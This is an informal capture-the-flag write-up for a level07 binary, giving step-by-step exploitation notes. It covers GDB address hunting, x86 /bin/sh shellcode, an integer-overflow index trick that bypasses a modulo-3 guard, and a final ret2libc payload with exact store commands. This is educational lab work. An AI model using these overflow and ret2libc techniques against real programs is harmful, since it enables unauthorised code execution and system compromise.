We can read up to index 686, after that we get a segfault as well as store

The attack is most likely a buffer overflow we have to perform by storing numbers directly, but it's tricky since we cannot put at an index multiple of 3
and there is the stack canary, the canary is just a value located at the bounds of the stack which is checked again on main return
But looking at the code, since we can set any byte we want and it's not a char overflow, we can just set values outside the check range of the canary
we have to find the right index to override one of the EIP saves on the stack

EIP save (on GDB) is stored at    0xffffd6ec
Numbers buffer (on GDB) starts at 0xffffd524

we need 0x1C8 (456) bytes to reach EIP, so 114 ints
so EIP should be overridable
we can verify by doing a read with index 114 in the program
and it prints 4158936339 (0xF7E45513 in hex) so it's the right index

Now we should be able to just add a shellcode in the environment and jump to it
the check (if number begins with 0x7b) should cause problem since environments variable starts with 0xffff)
So just try with the same shellcode as before:

env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')"

in GDB, using 'x/s *((char **) environ)' we can find env variable address
0xffffdb6d+0xa ('SHELLCODE=' size = 0xa) = 0xffffdb6e
add 500 to be in middle of NOPS:
0xffffdb6e+500 = 0xffffdd62

We need to convert the address to decimal since scanf expects an unsigned int
0xffffdd62 = 4294958434 

So we should input index: 114 and number: 4294958434

And it doesn't work, we didn't check but 114 is a multiple of 3, so we cannot use it to store a number, we need to find another EIP save to override
The thing is, since other functions are called after main, they are on top of stack (so addressses are lower) and we cannot overflow to reach them
we are forced to find something to override that is located before main on stack (so with higher address)

by doing 'objdump -d ./level07 | grep ret' we find around 15 ret's, we just need one that has the EIP associated stored lower on the stack (higher address)
so basically a function that is called before main

0x08048ac5 (located in _fini), EIP save stored at address 0xffffd8ec
0xffffd8ec - 0xffffd524 = 0x3C8 (968) bytes, so 242 ints, it's not divisble by 3 so it's good
so we should input index: '242' and number: '4294958434'

except that, after trying it in gdb, we see that we reaching _fini, the env is already unset, so the shellcode is not present anymore, so try a closer ret
so we just looked at main eip, with gdb found out that it comes from __libc_start_main+243, but we cannot find any ret, so _fini seems to be the only option

What we can do is take our shellcode, convert every 8 bytes to an unsigned integer and input it manually 4 bytes at a time, then jump to the buffer and tadaa

we restarted gdb so buffer is now at addres 0xffffd814

so now fini index is
0xffffd8ec - 0xffffd814 = 0xd8 (216) in int = 54

shell code in full hex is 
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
with strings as hex:
\x31\xC0\x31\xDB\xB0\x06\xCD\x80\x53\x68
\x2F\x74\x74\x79
\x68
\x2F\x64\x65\x76
\xE3\x31\xC9\x66\xB9\x12\x27\xB0\x05\xCD\x80\x31\xC0\x50\x68
\x2F\x2F\x73\x68
\x68
\x2F\x62\x69\x6E
\x89\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80

one line:
\x31\xC0\x31\xDB\xB0\x06\xCD\x80\x53\x68\x2F\x74\x74\x79\x68\x2F\x64\x65\x76\xE3\x31\xC9\x66\xB9\x12\x27\xB0\x05\xCD\x80\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80

so in 4 bytes hex it is (54 chars):

0x31C031DB 0xB006CD80 0x53682F74 0x7479682F 0x646576E3 0x31C966B9 0x1227B005 0xCD8031C0 0x50682F2F 0x7368682F 0x62696E89 0xE3505389 0xE199B00B 0xCD80

in decimal (https://www.convzone.com/hex-to-decimal/):
834679259 2953235840 1399336820 1954113583 1684371171 835282617 304590853 3447730624 1349005103 1936222255 1651076745 3813692297 3784945675 52608


im blocked on offset 0xffffd814 its so weird idk why it changed and now im cringed




linux:
buffer address: 0xffffd544
eip save stored at 0xffffd61c

0xffffd61c - 0xffffd544 = 0xd8 (216) in int = 54



Ok so maybe it's because _fini has some weird behavior, so we can try to find another ret
We find that exit is called in __libc_start_main right after the main() call
in exit we find a  'call   0xf7f55d73', if we look at what is present at this addres, we see:
mov ebx, DWORD PTR [esp]
ret

so we can try to override this ret, it's stored at 0xffffd704 (val is 0xf7e5eb76)

0xffffd704 - 0xffffd544 = 0x1c0 (448) in int = 112, it's not divisible by 3 so it's good
so if we try to read at index 112, we find: nothing it's empty :(




after all that, we tried negative index because we had no other ideas, and it works :D, so we guess the unsigned int is casted to a signed int, so we can use negative index
so now it should be pretty straightforward to override store_number ret to our shellcode

store_number EIP save stored at 0xffffd7ec (val is 0x080488ef)
buffer stored at 0xffffd814

0xffffd7ec - 0xffffd814 = -0x28 (-40) in int = -10, not a multiple of 3 so its good
since it's negative, -10
so we should input index: '-10' and number: <shellcode addr>
but when trying it, it seems that -10%3 == 0, i want to die

After messing with gdb, we find that the environment is bzero'ed in main as well as arguments, so we cannot use them to store our shellcode
so we need to store our shellcode in the buffer, and jump to it, or try ret2libc if we are lucky with indexes (since it shouldnt be a multiple of 3)

if we read at index -10, we get 0x08048930 (which is EIP save of read_number)

Ok so anyway we have to find a way to write at a protected index with another index, an overflow maybe ?
Also, we might aswell go back to main EIP save since it's easier to work with and we have the same problem on both main and store_number EIP

so we need to write at index 114, but it's protected, can we overflow to write to it ?
We tried uint_max as index in read, and in int it's casted to -1 so it's pretty nice
we can see that -4294967294 (- UINT_MAX) + 1 is converted to 2, so after messing around, we find that
read -4294967182 returns index 114, but when writing to it we get the "wil reserved" message, so it doesnt work

Since array is an int array, the asm needs to write to buf + 4 * index (because sizeof(int) == 4)
so if we input (UINT_MAX/4) + 1, we should arrive at index 1 with overflow (since when reading it also reads * 4, that's why we input + 1 and not +0.25)
so (4294967296/4) + 1 = 1073741825
lets try storing 9999 at index 1073741825, then reading at index 1, we should get back 9999
and it works, so we can use this to write to protected index
we want to write to index 114, so we need to write to index (4294967296/4 + 114) = 1073741938
if we write at this index, we can successfully retrieve it using read at 114 so we finally found a way to bypass the check and write to 114

if we do this in gdb, then 'quit' with a breakpoing on ret, we see that it will jmp to our input, so now we need to find where to jmp
We can do shellcode but as said before it would be tideous to input the shellcode manually with forbidden indexes, so we can try ret2libc first
https://beta.hackndo.com/retour-a-la-libc/
system address: 0xf7e6aed0 (to decimal: 4159090384)
"/bin/sh" address: 0xf7f897ec (to decimal: 4160264172)

so we need
indexes:      114               115                116
values:  [ system addr ] [ 4 random bytes ] [ "/bin/sh" addr ]

luckily since 114 is a multiple of 3, it means 115 and 116 can be used as they are without overflow or anything

we need the 4 random bytes because when entering system, it will expect eip save to be on top of the stack, (ebp+4), and arg at ebp+8
we can just don't touch it because we don't care if program crashes after system(), we got our shell so it's ok

so we should write:
store 4159090384 1073741938  (114 with overflow)
store 4160264172 116

now when we 'quit', we should jump to system("/bin/sh") and get our shell, and it works :D Finally after a lot of time we got our flag